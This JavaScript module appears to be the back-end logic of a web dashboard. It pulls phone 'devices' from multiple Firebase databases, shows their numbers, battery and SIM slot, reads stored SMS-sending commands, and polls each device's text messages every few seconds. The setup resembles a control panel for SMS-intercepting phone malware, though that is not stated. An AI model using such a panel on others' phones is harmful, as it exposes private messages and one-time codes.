/**
 * FIREBASE MANAGER - Realtime Database
 * NEW LOGIC: Device status based on latest message timestamp
 * Online = latest message < 1 hour old
 * Offline = latest message > 1 hour old OR no messages
 */

// ────────────────────────────────────────────────
// STATE
// ────────────────────────────────────────────────

let firebaseInstances = {};
let allDevices = [];
let deviceListeners = {};
let isInitialized = false;
let firebaseConfigsCache = null;
let pollingIntervals = {};
let deviceMessageCache = {}; // Cache latest message timestamp per device

// ────────────────────────────────────────────────
// CONFIG LOADING - FROM JSON FILE
// ────────────────────────────────────────────────

async function loadFirebaseConfigs() {
    console.log('📢 Loading Firebase configs from JSON file...');
    try {
        const response = await fetch('data/firebase-configs.json?' + Date.now());
        if (response.ok) {
            const data = await response.json();
            firebaseConfigsCache = data;
            localStorage.setItem('firebase_configs', JSON.stringify(data));
            console.log('✅ Firebase configs loaded:', data.sources ? data.sources.length : 0, 'sources');
            return data;
        }
    } catch (e) {
        console.log('⚠️ Error loading firebase-configs.json:', e.message);
    }
    
    try {
        const data = localStorage.getItem('firebase_configs');
        if (data) {
            const parsed = JSON.parse(data);
            if (parsed.sources && parsed.sources.length > 0) {
                firebaseConfigsCache = parsed;
                return parsed;
            }
        }
    } catch (e) {
        console.error('Error loading from localStorage:', e);
    }
    
    return { sources: [] };
}

// ────────────────────────────────────────────────
// INITIALIZATION
// ────────────────────────────────────────────────

async function initFirebaseConnections() {
    try {
        const configs = await loadFirebaseConfigs();
        console.log('📢 Firebase configs loaded:', configs);
        
        if (!configs || !configs.sources || configs.sources.length === 0) {
            console.log('📢 No Firebase sources configured');
            return false;
        }

        let successCount = 0;
        for (const source of configs.sources) {
            console.log(`📢 Connecting to Firebase: ${source.id}`);
            const connected = await connectToFirebase(source);
            if (connected) successCount++;
        }

        console.log(`📢 Connected to ${successCount}/${configs.sources.length} sources`);
        return successCount > 0;
    } catch (error) {
        console.error('❌ Error initializing Firebase:', error);
        return false;
    }
}

async function connectToFirebase(source) {
    try {
        const { id, url, key } = source;
        
        if (firebaseInstances[id] && firebaseInstances[id].connected) {
            return true;
        }

        console.log(`📢 Connecting to Firebase source: ${id}`);
        console.log(`📢 URL: ${url}`);

        const testUrl = `${url}/devices.json?auth=${key}&shallow=true`;
        const response = await fetch(testUrl);
        
        if (response.ok) {
            const data = await response.json();
            const count = data ? Object.keys(data).length : 0;
            console.log(`✅ Test query returned ${count} devices`);
            
            firebaseInstances[id] = {
                config: source,
                connected: true,
                url: url,
                key: key
            };
            return true;
        } else {
            console.error(`❌ Test failed: ${response.status}`);
            return false;
        }
    } catch (error) {
        console.error(`❌ Failed to connect:`, error);
        return false;
    }
}

function disconnectFromFirebase(sourceId) {
    try {
        if (pollingIntervals[sourceId]) {
            pollingIntervals[sourceId].forEach(interval => clearInterval(interval));
            delete pollingIntervals[sourceId];
        }
        if (firebaseInstances[sourceId]) {
            delete firebaseInstances[sourceId];
            console.log(`📢 Disconnected: ${sourceId}`);
        }
    } catch (error) {
        console.error(`❌ Error disconnecting:`, error);
    }
}

// ────────────────────────────────────────────────
// DEVICE MANAGEMENT - FROM devices.json
// ────────────────────────────────────────────────

async function fetchAllDevices() {
    allDevices = [];
    const sources = Object.keys(firebaseInstances);

    console.log(`📢 Fetching devices from ${sources.length} sources...`);

    for (const sourceId of sources) {
        const instance = firebaseInstances[sourceId];
        if (!instance.connected) continue;

        try {
            const devices = await fetchDevicesFromSource(sourceId);
            allDevices = allDevices.concat(devices);
        } catch (error) {
            console.error(`❌ Error fetching devices from ${sourceId}:`, error);
        }
    }

    console.log(`📢 Total devices found: ${allDevices.length}`);
    return allDevices;
}

/**
 * Extract phone number from device data
 */
function extractPhoneNumber(deviceData) {
    const locations = [
        deviceData.webhookEvent?.sendSms?.number,
        deviceData.command?.number,
        deviceData.number,
        deviceData.phone,
        deviceData.webhookEvent?.sendSms?.to,
        deviceData.command?.to,
        deviceData.phoneNumber,
        deviceData.sms?.number
    ];
    
    for (const loc of locations) {
        if (loc && loc !== 'N/A' && loc !== '') {
            let phone = String(loc).replace(/\s+/g, '');
            if (phone.startsWith('0')) {
                phone = '+91' + phone.substring(1);
            }
            if (phone.match(/^\d{10}$/)) {
                phone = '+91' + phone;
            }
            return phone;
        }
    }
    return 'N/A';
}

/**
 * Get the latest message timestamp for a device
 */
async function getLatestMessageTimestamp(deviceId, instance) {
    try {
        const { url, key } = instance;
        const apiUrl = `${url}/messages/${deviceId}.json?auth=${key}&orderBy="$key"&limitToLast=1`;
        
        const response = await fetch(apiUrl);
        if (!response.ok) return null;
        
        const data = await response.json();
        if (!data) return null;
        
        // Get the latest message (it's the only one since limitToLast=1)
        const messages = Object.values(data);
        if (messages.length === 0) return null;
        
        const latestMsg = messages[0];
        let timestamp = null;
        
        // Extract timestamp from various formats
        if (latestMsg.timestamp) {
            timestamp = latestMsg.timestamp;
        } else if (latestMsg.id) {
            timestamp = latestMsg.id;
        } else if (latestMsg.dateTime) {
            // Parse dateTime string like "06-08-2026 | 10:19 pm"
            const dateMatch = latestMsg.dateTime.match(/(\d{2})-(\d{2})-(\d{4}) \| (\d{1,2}):(\d{2}) (am|pm)/i);
            if (dateMatch) {
                let hours = parseInt(dateMatch[4]);
                const minutes = parseInt(dateMatch[5]);
                const ampm = dateMatch[6].toLowerCase();
                const day = parseInt(dateMatch[1]);
                const month = parseInt(dateMatch[2]) - 1;
                const year = parseInt(dateMatch[3]);
                
                if (ampm === 'pm' && hours < 12) hours += 12;
                if (ampm === 'am' && hours === 12) hours = 0;
                
                timestamp = new Date(year, month, day, hours, minutes).getTime();
            }
        }
        
        return timestamp;
    } catch (error) {
        console.error(`❌ Error getting latest message for ${deviceId}:`, error);
        return null;
    }
}

async function fetchDevicesFromSource(sourceId) {
    const instance = firebaseInstances[sourceId];
    if (!instance || !instance.connected) {
        throw new Error('Firebase not connected');
    }

    try {
        const { url, key } = instance;
        
        // Step 1: Fetch all devices
        const apiUrl = `${url}/devices.json?auth=${key}`;
        console.log(`📢 Fetching from: devices.json`);
        
        const response = await fetch(apiUrl);
        if (!response.ok) throw new Error(`HTTP ${response.status}`);
        
        const data = await response.json();
        const devices = [];

        if (!data) {
            console.log('⚠️ No devices found');
            return [];
        }

        const deviceIds = Object.keys(data);
        console.log(`📢 Found ${deviceIds.length} devices`);

        // Step 2: For each device, get latest message timestamp
        for (const deviceId of deviceIds) {
            const deviceData = data[deviceId];
            
            // Extract basic info
            const phoneNumber = extractPhoneNumber(deviceData);
            
            let battery = 50;
            if (deviceData.battery) {
                const batStr = String(deviceData.battery);
                battery = parseInt(batStr.replace('%', ''));
                if (isNaN(battery)) battery = 50;
            }
            
            // Get latest message timestamp
            const latestTimestamp = await getLatestMessageTimestamp(deviceId, instance);
            
            // ============================================
            // DETERMINE STATUS BASED ON LATEST MESSAGE
            // ============================================
            // Online if latest message is less than 1 hour old
            // Offline if latest message is older than 1 hour or no messages
            let status = 'offline';
            let lastSeen = new Date().toISOString();
            
            if (latestTimestamp) {
                const now = Date.now();
                const diffMs = now - latestTimestamp;
                const diffMinutes = diffMs / (1000 * 60);
                
                // If latest message is less than 1 hour old → ONLINE
                if (diffMinutes < 60) {
                    status = 'online';
                } else {
                    status = 'offline';
                }
                
                lastSeen = new Date(latestTimestamp).toISOString();
                console.log(`📢 Device ${deviceId.substring(0, 8)}...: latest message ${Math.round(diffMinutes)} mins ago → ${status}`);
            } else {
                // No messages → offline
                status = 'offline';
                console.log(`📢 Device ${deviceId.substring(0, 8)}...: no messages → offline`);
            }
            
            // Get SMS body from webhook or command
            const webhookData = deviceData.webhookEvent?.sendSms || {};
            const commandData = deviceData.command || deviceData.commands || {};
            const smsBody = webhookData.body || webhookData.message || webhookData.text || 
                           commandData.body || commandData.message || commandData.text || '';
            
            const device = {
                id: deviceId,
                sourceId: sourceId,
                name: deviceData.name || deviceId.substring(0, 8),
                number: phoneNumber,
                status: status,
                battery: battery,
                signal: '4G',
                model: webhookData.simSlot !== undefined ? `SIM ${parseInt(webhookData.simSlot) + 1}` : 
                       (commandData.simSlot !== undefined ? `SIM ${parseInt(commandData.simSlot) + 1}` : 'Unknown'),
                lastSeen: lastSeen,
                sims: phoneNumber !== 'N/A' ? [phoneNumber] : ['N/A'],
                unread: 0,
                raw: deviceData,
                smsBody: smsBody,
                smsSender: webhookData.number || webhookData.from || commandData.number || commandData.from || 'Unknown',
                smsTime: webhookData.timestamp ? timestampToISO(webhookData.timestamp) : 
                         (commandData.timestamp ? timestampToISO(commandData.timestamp) : new Date().toISOString()),
                latestTimestamp: latestTimestamp // Store for debugging
            };
            
            devices.push(device);
            
            const statusIcon = status === 'online' ? '🟢' : '🔴';
            console.log(`${statusIcon} Device: ${device.id.substring(0, 8)}... → ${device.number} (${status})`);
        }

        return devices;
    } catch (error) {
        console.error(`❌ Error fetching devices:`, error);
        throw error;
    }
}

function listenToDevices(callback) {
    if (pollingIntervals.devices) {
        clearInterval(pollingIntervals.devices);
    }
    
    const intervalId = setInterval(async () => {
        try {
            await fetchAllDevices();
            if (callback) callback(allDevices);
        } catch (error) {
            console.error('❌ Error polling devices:', error);
        }
    }, 10000); // Poll every 10 seconds

    pollingIntervals.devices = intervalId;
}

// ────────────────────────────────────────────────
// SMS MANAGEMENT - Fetch messages for a specific device
// ────────────────────────────────────────────────

async function fetchSmsForDevice(deviceId, sourceId, simNumber, limit = 150) {
    const instance = firebaseInstances[sourceId];
    if (!instance || !instance.connected) {
        throw new Error('Firebase not connected');
    }

    try {
        const { url, key } = instance;
        
        // Fetch messages for this specific device
        const apiUrl = `${url}/messages/${deviceId}.json?auth=${key}&orderBy="$key"&limitToLast=${limit}`;
        console.log(`📢 Fetching messages for device: ${deviceId.substring(0, 8)}...`);
        
        const response = await fetch(apiUrl);
        
        if (!response.ok) {
            if (response.status === 404) {
                console.log(`📢 No messages found for device: ${deviceId.substring(0, 8)}...`);
            }
            return [];
        }
        
        const data = await response.json();
        
        if (!data) {
            return [];
        }
        
        const messages = Object.values(data);
        
        // Sort by timestamp descending (newest first)
        messages.sort((a, b) => {
            const aTime = a.id || a.timestamp || 0;
            const bTime = b.id || b.timestamp || 0;
            return bTime - aTime;
        });
        
        return messages.map(msg => {
            let timeStr = '';
            if (msg.dateTime) {
                timeStr = msg.dateTime;
            } else if (msg.timestamp) {
                timeStr = timestampToISO(msg.timestamp);
            } else if (msg.id) {
                timeStr = timestampToISO(msg.id);
            } else {
                timeStr = new Date().toISOString();
            }
            
            return {
                id: msg.id || msg.timestamp || Date.now(),
                sender: msg.sender || msg.from || 'Unknown',
                body: msg.message || msg.body || msg.text || '',
                time: timeStr,
                simNumber: msg.simNumber || 'N/A',
                type: msg.type || 'incoming',
                raw: msg
            };
        });
        
    } catch (error) {
        console.error(`❌ Error fetching SMS for device ${deviceId.substring(0, 8)}...:`, error);
        return [];
    }
}

function listenToSms(deviceId, sourceId, simNumber, callback) {
    const pollKey = `sms_${sourceId}_${deviceId}`;
    if (pollingIntervals[pollKey]) {
        clearInterval(pollingIntervals[pollKey]);
        delete pollingIntervals[pollKey];
    }

    console.log(`📢 Starting continuous SMS polling for device: ${deviceId.substring(0, 8)}...`);

    let lastMessageCount = 0;

    const intervalId = setInterval(async () => {
        try {
            const messages = await fetchSmsForDevice(deviceId, sourceId, simNumber);
            
            if (messages.length > lastMessageCount) {
                console.log(`📢 New SMS detected for device: ${deviceId.substring(0, 8)}... (${messages.length} total)`);
            }
            
            lastMessageCount = messages.length;
            
            if (callback) callback(messages);
        } catch (error) {
            console.error('❌ Error polling SMS:', error);
        }
    }, 3000);

    pollingIntervals[pollKey] = intervalId;
    
    return () => {
        if (pollingIntervals[pollKey]) {
            clearInterval(pollingIntervals[pollKey]);
            delete pollingIntervals[pollKey];
        }
    };
}

// ────────────────────────────────────────────────
// EXPOSE TO GLOBAL SCOPE
// ────────────────────────────────────────────────

window.loadFirebaseConfigs = loadFirebaseConfigs;
window.initFirebaseConnections = initFirebaseConnections;
window.connectToFirebase = connectToFirebase;
window.disconnectFromFirebase = disconnectFromFirebase;
window.fetchAllDevices = fetchAllDevices;
window.fetchDevicesFromSource = fetchDevicesFromSource;
window.listenToDevices = listenToDevices;
window.fetchSmsForDevice = fetchSmsForDevice;
window.listenToSms = listenToSms;
window.firebaseInstances = firebaseInstances;
window.allDevices = allDevices;
window.pollingIntervals = pollingIntervals;
